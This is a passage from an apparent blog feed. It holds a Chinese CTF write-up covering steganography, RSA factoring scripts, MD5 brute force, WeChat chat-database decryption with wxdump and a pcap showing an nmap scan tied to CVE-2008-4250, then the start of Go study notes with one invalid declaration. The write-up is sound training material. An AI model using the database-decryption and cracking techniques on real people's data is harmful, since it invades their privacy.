src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MDdhMDA5YTYzMWVkYTJkM2RlOGQ0NDU5MDA0Y2RiYTJfaUlTM1ZPTTVJbko0WEZWaGRXdUtxQmw5WENuNXFza3FfVG9rZW46RUV4MWJXUWUwb2M3bTh4Tk5NMGNVeWhWbjFmXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><h2 id="17-tcpl"><a class="markdownIt-Anchor" href="#17-tcpl"></a> 1.7 TCPL</h2><p>十六进制下看到这个是个RISCV64架构的elf文件</p><p>在搭环境</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTFlNTRkMWVhZWY0OGNiYzQyYTBmZGM5M2UxNzY0MGJfNHp4UzJ2V0Z6aWdNb1c4cXc3dWhxbFpDWGk0ekVHZktfVG9rZW46STVWRGJHQm8wb1Iyb2h4bjhiTmN5TG43bmNnXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><p>打异构pwn打的</p><h2 id="18-九转大肠"><a class="markdownIt-Anchor" href="#18-九转大肠"></a> 1.8 九转大肠</h2><p>第一层压缩包密码是XYCTF20240401</p><p>第一层：曰：玉魔命灵天观罗炁观神冥西道地真象茫华茫空吉清荡罗命色玉凶北莽人鬼乐量西北灵色净魂地魂莽玉凶阿人梵莽西量魄周界</p><p>天书加密，图片改高</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NThiNjkxZmRiMjI2ZmQ3MzdmMjkwZmEzYWY5MmQxOTJfWlhXVFVNbmNXNFludmJkSTY3TnFnem9RYWl4alZDSUdfVG9rZW46THNESmJ5anhVb2RwSGp4ZVl3cWNjcTFXblNjXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=OGEyNmM5YWYyYzE3NTdhY2Q1YWU5ODhmMDEzNTQ1Y2Nfd05RN2FRN3hZSElxTXdQTnhnY0U0Wnh3anp1Mld5UUdfVG9rZW46UXVhb2JONmI5bzVtUDF4WGgxU2NaRnpqbjBnXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><p>第二层</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NzY0NzQ2NTZmZWE3MTRkODY1ZmY3NGNjMmY3ZjdlMjNfc2t4MnRvcGZVVnNBNWJEblloSDFRTlFkTlhRU2JBbVdfVG9rZW46VFNzVWJDaUlDb3lqMFl4QVp4YmM1bUcybjFnXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><p>得到：</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDFiMGVmNjk4ODNiNGU0ZDg3NzY2YWQ1ZTk3ZTcyMDdfdHdsbW9MWm10aVExbVpLOWQxaFljZzhyNjBDTVNYRk5fVG9rZW46RFprTGI5V3YxbzVwY2V4OGV1T2NPUk5sbldjXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><p>LSB隐写得到 0f_crypt0_and_</p><p>第三层</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MWY4OTk1MzU5MGE2MzNjZjBmODQyOGRhODQ0YzE0NDJfRFdDZkt5c1BQWVFLaXd6VnlZZXd3d21SVmNMYThKUnNfVG9rZW46SXJaYWJJOHZBb0dwazJ4cTNiTWNQNXpmbjliXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><p>1是点2是线3是空格</p><p>要小写。解zip得到flag.txt和一个zip，flag.txt找不到有价值的信息</p><p>暂时无法在飞书文档外展示此内容</p><p>zip用7z打开提取显示数据错误，但是十六进制下看到可以的字符串</p><p>5a+G56CB57uZ5L2g5Y+I5oCO5qC377yaMTIzNDU2</p><p>解码结果如下</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NjM2MGZlOTQxY2MwYzkwOTQyZTIzODFkMjczM2Q4ZjFfV1UyOTJOSFpQWEFtMjZvVGZLN1M3UUhkd3BBajl2WVFfVG9rZW46SWJwbWJ0Snpab3VwZ2t4ZlV2cWNrUmpxbjZmXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><p>得到MZWGCZZT566JU3LJONRV6MLTL5ZGKNTMNR4V6ZTVNYQSC===</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=YThhMzE2YTMwYTcyMGM3NzA1ZGE4ZTBjMzU1ZTZhNDJfUkgwd1RjckE0R0FmODJ5eXRNR1VpR2RsVDZRMlJ3R09fVG9rZW46RFdMMWJVYlpJb1FJVnF4VE5qWWMyVGNjbm1oXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><p>misc_1s_re6lly_fun!!</p><p>第四层</p><p>U2FsdGVkX1+y2rlJZlJCMnvyDwHwzkgHvNsG2TF6sFlBlxBs0w4EmyXdDe6s7viL</p><p>长得像aes</p><p>3des</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=M2YzOWE5OTA3YzA0NzJlMDIzMDhmZTdjNjczZDMxMmRfbm80YTllZlo4M0Y1TXFYa3B3ZW9JcGpCQ1RRTmVHcGRfVG9rZW46WXNTNmIxcUQyb3VMWlN4dFoyNGNyckZKbjdjXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><p>The_fourth_floor_is_okay</p><p>压缩包里一个txt一个db文件，txt解码得</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NmI3YjhkNDg2ZGNjNjZhOGFmOWI5Yzc1MGJkMmI3MGRfMXlVYm01RHJhWlJiMzFYN01mUDhzN05KRXBjWlJJTWtfVG9rZW46UW1TbWI4T1VwbzRFa0R4NGRZbGNmZEg3bnUyXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><p>key：1a813cbb17c040358d772e37fa137edbeddedb38bf704a56b2a9e22dc7f05f77</p><p>但是MSG0.db没法用navicat打开，db browser也打不开，显示不是一个数据库，但是应该就是微信聊天记录数据库文件，大小60M刚好（好强的既视感）。十六进制打开发现文件头根本不是db文件的文件头，这点比较蹊跷</p><p>微信聊天数据库解密用的wxdump，</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=YzVkZmFhMTk5ZGU2M2VmMWZkOTIzMTlkOGNmMjU3N2ZfNUpHMEI0YVJlRWdGNnlOSEV4cVJTYzZVVXBpVVJZNUVfVG9rZW46TURtdGJPT3gxb1QwUFF4OWpOSGNTMGZGbjhnXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><p>用navicat打开就行</p><p>L1u_and_K1cky_Mu</p><p>第五层</p><p>enc = ‘key{liu*****’</p><p>md5 = ‘87145027d8664fca1413e6a24ae2fbe7’</p><p>应该是要md5爆破</p><p>爆破出来key{liuyyds}</p><p>得到serpent.txt和flag.txt，flag里依然显示啥都没有，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这里什么都没有呦！</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ô;ëST†C`è(|B‚R�½5ƒXD–bNœ§½&gt;LZÒæuƒýïÔ+¼Í‚+Ð‰-pÇX+¾§fÜ-^ÌbY. ™&quot;ªEÉ©´QeÚ–)5Ëðo&#123;¤õ%‡AîüK†Ácß3‹ï48/¶?¨¤&#123;?zÄð0Y�Î</span><br><span class="line">ÆMÈmhÞ½ArGÈ©%`­q¯�Î=„µñË&amp;§Bæã‘.sæ!ia5ÎÒDÄõ8×tu)õàà0‡jº?àô`5å[‡C¥Ôä7G°ì¦ê£`uÍÑ‚í•T‹�°€qæÊ-vw7E�Os¬RG›oÀZþeÿJjD¸zîb2åÊ&amp;i-²ÎPiž¡�iÐì±u�“Kp‡ÒGÆµ.&gt;ÄF™ê�ž`ãß�ùwB-&#123;%�œ&gt;&quot;!</span><br><span class="line">|Wl</span><br><span class="line">¦D7ä§-?Ø5&amp;ˆjMë³º2E]þÂ¬®WƒŒçlÓ`œ2GÇÓ&#123;›aÓ(TŒÜ‚6ƒ¿$÷Wªøð&lt;¼Už!&gt;Âr(¢</span><br></pre></td></tr></table></figure><p>密钥是liuyyds，对文件解serpent，然后vim看到零宽的unicode字符，零宽隐写</p><p>_3re_so_sm4rt!</p><p>第六层</p><p>hint是键盘画图，用手机输入法应该可以操作，但是有些字符好怪（</p><p>keeponfighting可以解得一个文件夹</p><p>steghide，密码98641</p><p>In_just_a_few_m1nutes_</p><p>第七层</p><p>提示维吉尼亚，发现</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmIxZWYwM2QzZjM5N2I2NDI1NzIyNjM5NTM0ODY4MGVfbVZpU3QwNFA2Sm9zY0R0SEtiRHdqZHM0UkZ0Z2VjcUxfVG9rZW46SWlWWGJvS3hDb0pNemJ4eU50VmM3SHE2bmhmXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><p>然而密码并不是这个</p><p>+AF8-在utf-7中是下划线，所以把空格换成下划线就行了。</p><p>The_seventh_level_is_difficult</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NzU5ZmVjZGFkMGE3MDQ1YTE0ZjUwNWVmN2JjMzEzNjBfWm9hN2V1VG1jVEVFZDhZdUlOZlJibmNqOFRxQVJ1R3RfVG9rZW46Rk9NTWJ6MXZwb1BNN2Z4UDc4d2NLdnh6bllnXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><p>八进制</p><p>they_were_thr0ugh!</p><p>第八层</p><p>题目是一道rsa，给了n, e, c和p^q</p><p>考虑到p, q都是1024位，且已知异或结果，那么就可以进行爆破（p^q对应位是1，那可能p=0，q=1或p=1，q=0，对应位0，那可能p=0，q=0或p=1，q=1）</p><p>那么就用剪枝算法爆破。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">sys.setrecursionlimit(<span class="number">3939</span>)        <span class="comment">#不设置一下最大递归深度的话已经超出了（</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">22424440693845876425615937206198156323192795003070970628372481545586519202571910046980039629473774728476050491743579624370862986329470409383215065075468386728605063051384392059021805296376762048386684738577913496611584935475550170449080780985441748228151762285167935803792462411864086270975057853459586240221348062704390114311522517740143545536818552136953678289681001385078524272694492488102171313792451138757064749512439313085491407348218882642272660890999334401392575446781843989380319126813905093532399127420355004498205266928383926087604741654126388033455359539622294050073378816939934733818043482668348065680837</span></span><br><span class="line">c = <span class="number">1400352566791488780854702404852039753325619504473339742914805493533574607301173055448281490457563376553281260278100479121782031070315232001332230779334468566201536035181472803067591454149095220119515161298278124497692743905005479573688449824603383089039072209462765482969641079166139699160100136497464058040846052349544891194379290091798130028083276644655547583102199460785652743545251337786190066747533476942276409135056971294148569617631848420232571946187374514662386697268226357583074917784091311138900598559834589862248068547368710833454912188762107418000225680256109921244000920682515199518256094121217521229357</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">pq_xor = <span class="number">14488395911544314494659792279988617621083872597458677678553917360723653686158125387612368501147137292689124338045780574752580504090309537035378931155582239359121394194060934595413606438219407712650089234943575201545638736710994468670843068909623985863559465903999731253771522724352015712347585155359405585892</span></span><br><span class="line"></span><br><span class="line">n_bits = <span class="number">1024</span></span><br><span class="line">xor = <span class="built_in">bin</span>(pq_xor)[<span class="number">2</span>:].zfill(n_bits)        <span class="comment">#由于p，q的开头至少第一位肯定是1，所以实际上还得在前面补0</span></span><br><span class="line">p_s = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pq_high_xor</span>(<span class="params">p=<span class="string">&quot;&quot;</span>, q=<span class="string">&quot;&quot;</span></span>):        <span class="comment">#高位进行爆破</span></span><br><span class="line">    lp, lq = <span class="built_in">len</span>(p), <span class="built_in">len</span>(q)</span><br><span class="line">    tp0 = <span class="built_in">int</span>(p + (<span class="number">1024</span> - lp) * <span class="string">&quot;0&quot;</span>, <span class="number">2</span>)</span><br><span class="line">    tq0 = <span class="built_in">int</span>(q + (<span class="number">1024</span> - lq) * <span class="string">&quot;0&quot;</span>, <span class="number">2</span>)</span><br><span class="line">    tp1 = <span class="built_in">int</span>(p + (<span class="number">1024</span> - lp) * <span class="string">&quot;1&quot;</span>, <span class="number">2</span>)</span><br><span class="line">    tq1 = <span class="built_in">int</span>(q + (<span class="number">1024</span> - lq) * <span class="string">&quot;1&quot;</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> tp0 * tq0 &gt; n <span class="keyword">or</span> tp1 * tq1 &lt; n:        <span class="comment">#如果当前pq最小值相乘都比n大或者pq最大值相乘都比n小，那么肯定不符合，可以返回了</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> lp == n_bits:        <span class="comment">#当前递归深度下p的长度达到1024位的话表明得到一个可能的解</span></span><br><span class="line">        p_s.append(tp0)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> xor[lp] == <span class="string">&quot;1&quot;</span>:        </span><br><span class="line">        pq_high_xor(p + <span class="string">&quot;0&quot;</span>, q + <span class="string">&quot;1&quot;</span>)</span><br><span class="line">        pq_high_xor(p + <span class="string">&quot;1&quot;</span>, q + <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pq_high_xor(p + <span class="string">&quot;0&quot;</span>, q + <span class="string">&quot;0&quot;</span>)</span><br><span class="line">        pq_high_xor(p + <span class="string">&quot;1&quot;</span>, q + <span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">pq_high_xor()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> p_s:        <span class="comment">#常规RSA</span></span><br><span class="line">    q = n // p</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = inverse(e, phi)</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>得到结果是 password{pruning_algorithm}</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>暂时无法在飞书文档外展示此内容</p><p>转成01，画图，尺寸548*72</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=ODYyZWYyNDFkY2E4NmZmOGE2ODcxMjZlNjk5MGZmYjdfb0lEQnZIVHczeG5RandDcnNXVGpLQ05HNm5oamRtQmtfVG9rZW46RzFtbGJDS3J4b3IwcWl4eDNHd2NEb0F4bklkXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><p>原神须弥沙漠文</p><p>sm3rty0ucando</p><p>第九层</p><p>题目告诉我们$$a_1p+b_1q=l_1\ a_2p+b_2q=l_2$$，但是$$a_1,a_2,b_1,b_2,p,q$$均未知，只知道 $$a_1,a_2&lt;2<sup>8,b_1,b_2&lt;2</sup>{256}$$。</p><p>注意到$$a_1a_2p+b_1a_2q=l_1a_2\a_1a_2p+a_1b_2q=a_1l_2$$，得$$(b_1a_2-a_1b_2)q=l_1a_2-a_1l_2$$，</p><p>于是可以通过爆破 $$a_1,a_2$$的值，求 $$q=gcd(l_1a_2-a_1l_2,n)$$，最终检查 q.bit_length() ==512，解出p,q</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">107803636687595025440095910573280948384697923215825513033516157995095253288310988256293799364485832711216571624134612864784507225218094554935994320702026646158448403364145094359869184307003058983513345331145072159626461394056174457238947423145341933245269070758238088257304595154590196901297344034819899810707</span></span><br><span class="line">c = <span class="number">46049806990305232971805282370284531486321903483742293808967054648259532257631501152897799977808185874856877556594402112019213760718833619399554484154753952558768344177069029855164888168964855258336393700323750075374097545884636097653040887100646089615759824303775925046536172147174890161732423364823557122495</span></span><br><span class="line">l = [<span class="number">618066045261118017236724048165995810304806699407382457834629201971935031874166645665428046346008581253113148818423751222038794950891638828062215121477677796219952174556774639587782398862778383552199558783726207179240239699423569318</span>, <span class="number">837886528803727830369459274997823880355524566513794765789322773791217165398250857696201246137309238047085760918029291423500746473773732826702098327609006678602561582473375349618889789179195207461163372699768855398243724052333950197</span>]</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="keyword">for</span> a1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">257</span>):</span><br><span class="line">    <span class="keyword">for</span> a2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">257</span>):</span><br><span class="line">        l_ = <span class="built_in">abs</span>(l[<span class="number">0</span>] * a2 - l[<span class="number">1</span>] * a1)</span><br><span class="line">        q = GCD(l_, n)</span><br><span class="line">        <span class="keyword">if</span> q != <span class="number">1</span> <span class="keyword">and</span> q.bit_length() == <span class="number">512</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;q =&#x27;</span>, q)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;p =&#x27;</span>, n // q)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 解得</span></span><br><span class="line">q = <span class="number">12951283811821084332224320465045864899191924765916891677355364529850728204537369439910942929239876470054661306841056350863576815710640615409980095344446711</span></span><br><span class="line">p = <span class="number">8323779962971618345273954895424806333469829912334300198060342319777227207496747203116360364049448374664074985646069999780324150495814809237871806097818437</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br></pre></td></tr></table></figure><p>解得game_over</p><p>压缩包里两个文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">压缩包里的图片真的有东西吗？不如看向外面</span><br></pre></td></tr></table></figure><p>还有一个zip压缩包</p><p>应该是oursecret隐写，但是尚未知道密码，可以确定的是是对压缩包进行隐写的而不是对图片</p><p>密码也是game_over</p><p>找到_nine_turns?}</p><p>flag汇总：XYCTF{T3e_c0mb1nation_0f_crypt0_and_misc_1s_re6lly_fun!!L1u_and_K1cky_Mu_3re_so_sm4rt!In_just_a_few_m1nutes_they_were_thr0ugh!Sm3rt_y0u_can_do_nine_turns?}</p><p>要整一坨拿去md5，然后再套flag头</p><p>XYCTF{b1bdc6cf06a28b97c91c1c12f0d3bc00}</p><p>可惜三血被抢了</p><h2 id="19-网络追踪"><a class="markdownIt-Anchor" href="#19-网络追踪"></a> 1.9 网络追踪</h2><p>经过了一系列骚操作（其实就是用wireshark筛TCP流，很容易发现这个流量包是在用nmap在扫描靶机端口，查看有哪些端口完成了三次握手，代表端口开放）</p><p>找到了这玩意</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MjBhZWFiNmZhODU2NTU3NGJhOTBjMTM5MDNjMTUzYWZfd2VrSjRHNzZXRERGRUZSODR2cjVOM1MyVzd4MkJQaEFfVG9rZW46U0tEd2J6aGpGb3pDOVZ4RERwaWNDUVE3bkFoXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hK3Z1J2NvNa3fNJxaP43bTEfbb7zafODbacFaP43bte0wtPmDvvmOK3Z1J2Nv</span><br><span class="line">huNqqtdmuOL1Zb91ZbM-TPapVQCO7eyODXyK5iiSOVCaRhiOQiiKwUCOIjiSO</span><br><span class="line">hVCSffyKDcmXbZ95Zd8TZW91Zg6zaXd9ZW7QUt9WhuNSottGcLyWzayWVXCWz</span><br><span class="line">hbiOCdGZTu6urtMyKuNqqtdmuQqVZP4nYjPzbZ8XbacHaj6zah7vbacF1JYLb</span><br><span class="line">hj7PZXvRx0iGyWyywaZVNEpF4Sn2iAGsl9X3TC1UsLnUsLnVTEpN39H6kA1Yh</span><br><span class="line">3An2kAro+</span><br></pre></td></tr></table></figure><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NWFhYTk5YjZhOWIwY2Y2MDRjMTQyNjg3MTkxNTViNDFfQlFnVUF4V05mbmIwSzluR1dnMHdTeDN4N2xpNEc3V1ZfVG9rZW46SWJIVWJaeXo2b3NFMm94bUNJeWMyMHBjbkhmXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><p>经过漫长的信息检索后</p><p>XYCTF{192.168.204.133_445_139_135_<strong>CVE-2008-4250</strong>}</p><p>wireshark中显示的1065端口也是开放的，但这是利用漏洞打开的端口，一开始只开放了445，139，135三个端口</p><h2 id="110-base"><a class="markdownIt-Anchor" href="#110-base"></a> 1.10 base</h2><p>LBMUGVCGPNRDEOJUHE3GKMDGGY2GMYQ=NzY3NzIzNjE0ZjA5MzBiZjgxY30</p><p>等号与之前为第一段</p><p>XYCTF{b29496e0f64fb</p><p>第二段如base64</p><p>767723614f0930bf81c}</p><h2 id="111-osint1"><a class="markdownIt-Anchor" href="#111-osint1"></a> 1.11 osint1</h2><p>滨海新区，天津？根据hint，不是天津</p><p>广东茂名滨海新区**<a href="https://baike.baidu.com/item/%E5%8D%9A%E8%B4%BA%E6%B9%BE%E6%96%B0%E5%9F%8E/22309890?fromModule=lemma_inlink">博贺湾</a>**<strong>大道</strong></p><p>不对</p><p>百度识图</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGE1NzRjZDU4MjAzM2E4ZDI5OTVmOTcxZWJkNzY0ODVfTlo4T2xxTTVlWmdkUGFhTzhTQlNDcktJSmhhcVdyUFVfVG9rZW46TXVWRWIyUUpDb2k4WEZ4OTBxd2N2bDhjbmVkXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><p>在一篇blog中找到导航图，那么位置就可以确定了</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=YWUwZDk1YzE3ZjMzZTVlNzYyZWEwZTliNTYxMzk4NGJfU05VQ241TjlaRXpoQTFtOUJJeEl0NDBCazc0QnFRdzJfVG9rZW46VW5rWWJLR1Vub1UyV3d4Y2ZHU2MzTDBjbmxnXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><p>在高德地图找到相应位置</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=OWE1N2Q0Yjk2MTFmYmRlNGU1NDE1ZjQzMTBiNWIwNDhfdmVmdnlxWkl5QVo4TG5UQUc3ZmVPTDV0V1Y1czRiRUNfVG9rZW46Q1V6YWJtb1Rlb3lQdXh4QUZDb2NxZXhpbmhlXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA" alt="img" /></p><p>滨海东路。</p><p>那么就确定flag了。</p><p>江苏省南通市滨海东路黄海</p><p>xyctf{江苏省|南通市|滨海东路|黄海}</p><h2 id="112-真签到"><a class="markdownIt-Anchor" href="#112-真签到"></a> 1.12 真签到</h2><p>十六进制下就有flag</p><h2 id="113-osint2"><a class="markdownIt-Anchor" href="#113-osint2"></a> 1.13 OSINT2</h2><p>河南省，G3293次列车</p><p>龙门石窟？不对</p><p>高德搜周边 一个个试</p><p>最后结果是</p><p>老君山</p><p>xyctf{G3293|河南省|老君山}</p><h2 id="114-base10242"><a class="markdownIt-Anchor" href="#114-base10242"></a> 1.14 base1024*2</h2><p>XYCTF{84ca3a6e-3508-4e34-a5e0-7d0f03084181}</p><p><a href="https://nerdmosis.com/tools/encode-and-decode-base2048">https://nerdmosis.com/tools/encode-and-decode-base2048</a></p><h2 id="115-出题有点烦"><a class="markdownIt-Anchor" href="#115-出题有点烦"></a> 1.15 出题有点烦</h2><p>压缩包密码123456</p><p>第一张图：XYCTF{可惜是假的}</p><p>第二三四张图：没东西</p><p>第五张图隐写了个压缩包，解开，密码是xyctf，十六进制看文件有flag</p><p>XYCTF{981e5_f3ca30_c841487_830f84_fb433e}</p><h2 id="116-ez_osint"><a class="markdownIt-Anchor" href="#116-ez_osint"></a> 1.16 ez_osint</h2><p>网上搜文本的头可以搜到时光邮局，评论区想笑死谁？</p><hr /><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/83776a4079fc052d284173c78b0c838c.jpeg" alt="83776a4079fc052d284173c78b0c838c" /></p>]]></content>
      
      
      <categories>
          
          <category> CTF Write Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go修炼手册——程序结构</title>
      <link href="/posts/a280ef22aa55/"/>
      <url>/posts/a280ef22aa55/</url>
      
        <content type="html"><![CDATA[<p>关于笔者学习Go语言中零零散散做的一些笔记。我用的参考资料是《Go语言圣经》，附上项目地址<a href="https://golang-china.github.io/gopl-zh/print.html">Go语言圣经 (golang-china.github.io)</a>。感兴趣的话可以自行阅读。</p><h2 id="程序结构"><a class="markdownIt-Anchor" href="#程序结构"></a> 程序结构</h2><h3 id="声明"><a class="markdownIt-Anchor" href="#声明"></a> 声明</h3><p>有四种类型的声明语句：var、const、type和func，分别对应变量、常量、类型和函数实体对象的声明。</p><p>每个源文件中以包的声明语句开始，说明该源文件是属于哪个包。包声明语句之后是import语句导入依赖的其它包，然后是包一级的类型、变量、常量、函数的声明语句，包一级的各种类型的声明语句的顺序无关紧要</p><p>一个函数的声明由一个函数名字、参数列表（由函数的调用者提供参数变量的具体值）、一个可选的返回值列表和包含函数定义的函数体组成。如果函数没有返回值，那么返回值列表是省略的。</p><p>比如声明一个函数。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fToC</span><span class="params">(f <span class="type">float64</span>)</span></span> <span class="type">float64</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (f<span class="number">-32</span>)*<span class="number">5</span>/<span class="number">9</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>顺便一提在Go语言中无须以分号结尾，事实上每个go文件在编译时都会被自动格式化而在每一行的末尾自动加上分号。</p><h3 id="变量"><a class="markdownIt-Anchor" href="#变量"></a> 变量</h3><p>变量的声明语法一般如下</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> varietyName Type = expression <span class="comment">//变量名 类型 表达式</span></span><br></pre></td></tr></table></figure><p>实际上实际上“类型”或者“=表达式”两个部分可以省略其中的一个。如果省略类型，那么将根据初始化表达式来推导变量的类型信息。如果初始化表达式被省略，那么将用零值初始化该变量。</p><blockquote><p>数值类型变量对应的零值是0，布尔类型变量对应的零值是false，字符串类型对应的零值是空字符串，接口或引用类型（包括slice、指针、map、chan和函数）变量对应的零值是nil。数组或结构体等聚合类型对应的零值是每个元素或字段都是对应该类型的零值。</p></blockquote><p>具体的例子可以参考如下。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> i,j,k <span class="type">int</span> <span class="comment">//int,int,int 一组变量只声明类型</span></span><br><span class="line"><span class="keyword">var</span> i,j,k = <span class="literal">true</span>,<span class="number">2.3</span>,<span class="string">&quot;four&quot;</span> <span class="comment">//bool,float64,string 一组变量由表达式自动推导类型</span></span><br><span class="line"><span class="keyword">var</span> f,err = os.Open(name) <span class="comment">//os.Open returns a flie and an error 一组变量也可以由函数多个返回值初始化</span></span><br></pre></td></tr></table></figure><p>或者使用“<strong>简短变量声明</strong>”来声明和初始化局部变量。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">t := <span class="number">0.0</span></span><br></pre></td></tr></table></figure><p>使用简短变量声明必须要声明一个新的变量。对于已经声明过的变量，简短语句声明和多重赋值操作等价。</p><h3 id="指针"><a class="markdownIt-Anchor" href="#指针"></a> 指针</h3><p>和C概念类似，用形如<code>*int</code>来声明一个指针变量。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">1</span></span><br><span class="line">p := &amp;x <span class="comment">//p为int*</span></span><br><span class="line"><span class="keyword">var</span> ptr <span class="type">int</span>* <span class="comment">//显式声明</span></span><br></pre></td></tr></table></figure><p>任何类型的指针零值都是<code>nil</code>。</p><p>在Go语言中，返回函数中局部变量的地址也是安全的。</p><p>例如下面的代码，调用f函数时创建局部变量v，在局部变量地址被返回之后依然有效，因为指针p依然引用这个变量。用Go语言的术语来说，这个变量从函数f中<strong>逃逸</strong>了。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p = f()</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">f</span><span class="params">()</span></span> *<span class="type">int</span> &#123;</span><br><span class="line"> v := <span class="number">1</span></span><br><span class="line"> <span class="keyword">return</span> &amp;v</span><br><span 